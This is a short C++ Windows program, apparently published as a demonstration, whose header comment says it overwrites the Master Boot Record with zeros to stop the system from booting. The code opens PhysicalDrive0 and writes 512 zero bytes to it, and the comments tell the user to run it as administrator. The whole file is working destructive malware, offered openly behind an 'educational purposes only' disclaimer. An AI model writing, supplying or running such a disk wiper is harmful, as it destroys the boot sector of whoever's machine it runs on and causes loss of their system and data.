//  ███╗   ███╗███████╗███╗   ███╗ ██████╗ ██████╗ ██╗   ██╗     ██████╗ ██╗   ██╗███████╗██████╗ ██╗    ██╗██████╗ ██╗████████╗███████╗
//  ████╗ ████║██╔════╝████╗ ████║██╔═══██╗██╔══██╗╚██╗ ██╔╝    ██╔═══██╗██║   ██║██╔════╝██╔══██╗██║    ██║██╔══██╗██║╚══██╔══╝██╔════╝
//  ██╔████╔██║█████╗  ██╔████╔██║██║   ██║██████╔╝ ╚████╔╝     ██║   ██║██║   ██║█████╗  ██████╔╝██║ █╗ ██║██████╔╝██║   ██║   █████╗  
//  ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║   ██║██╔══██╗  ╚██╔╝      ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██║███╗██║██╔══██╗██║   ██║   ██╔══╝  
//  ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╔╝██║  ██║   ██║       ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║╚███╔███╔╝██║  ██║██║   ██║   ███████╗
//  ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝        ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝
//  Made by: PunGrumpy
//  Description: Overwrites the MBR with zeros (0x00)
//  Purpose: To prevent the system from booting
//  Usage: Compile the program and run it as administrator
//  Note: This program is for educational purposes only. I am not responsible for any damage caused by this program.

#include <Window.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512 // Size of the MBR

int main() {
    DWORD write; // Variable to store the number of bytes written
    char mbrData[MBR_SIZE]; // Array to store the MBR data

    // Fill the array with zeros (Overwrite the MBR)
    ZeroMemory(&mbrData, (sizeof mbrData));

    // Open the drive to the physical memory
    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    
    // Write the data to the physical memory
    if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == true) {
        cout << "MBR Overwritten!" << endl;
        Sleep(5000);
        ExitProcess(0);
    } else {
        cout << "MBR Not Overwritten!" << endl;
        Sleep(5000);
        ExitProcess(0);
    }

    // Close the handle to the physical memory
    CloseHandle(MasterBootRecord);

    return EXIT_SUCCESS;
}